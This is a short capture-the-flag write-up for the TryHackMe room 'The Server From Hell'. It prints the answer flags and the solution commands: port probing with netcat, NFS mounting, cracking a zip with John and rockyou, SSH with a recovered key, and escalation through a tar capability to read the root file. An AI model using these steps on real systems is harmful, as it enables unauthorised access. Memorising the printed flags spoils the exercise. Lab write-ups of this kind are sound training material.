
# <div align="center">[The Server From Hell](https://tryhackme.com/r/room/theserverfromhell)</div>
<div align="center">Face a server that feels as if it was configured and deployed by Satan himself. Can you escalate to root?</div>
<br>
<div align="center">
<img src="https://github.com/user-attachments/assets/3a3b65e4-3de2-44be-aa41-86db563c6f0f" height="200"></img>
</div>

## Task 1. Hacking the server
Start at port 1337 and enumerate your way.
Good luck.
### flag.txt
```
thm{h0p3_y0u_l1k3d_th3_f1r3w4ll}
```
### User.txt
```
thm{sh3ll_3c4p3_15_v3ry_1337}
```
### Root.txt
```
thm{w0w_n1c3_3sc4l4t10n}
```
## Let start 
* For flag
```
nc <IP> 1337
for i in {1..100};do nc <IP> $i;echo "";done
nc <IP> 12345
nmap -sC -sV -p111,2049 <IP>
mkdir nfs  
sudo mount -t nfs <ip>: nfs           
tree nfs
zipinfo backup.zip
zip2john backup.zip > backup.hash
john backup.hash --wordlist=/usr/share/wordlists/rockyou.txt
cat flag.txt
```
* For User flag
```
cat hint.txt
nmap -sV -p 2500-4500 <IP> | grep -i ssh
chmod 600 id_rsa
ssh -i id_rsa hades@<IP> -p 3333
exec '/bin/bash'
cat user.txt
```
* For Root flag
```
getcap -r / 2>/dev/null
tar -cvf flag.tar /root/root.txt
tar xf flag.tar 
cat root/root.txt
```
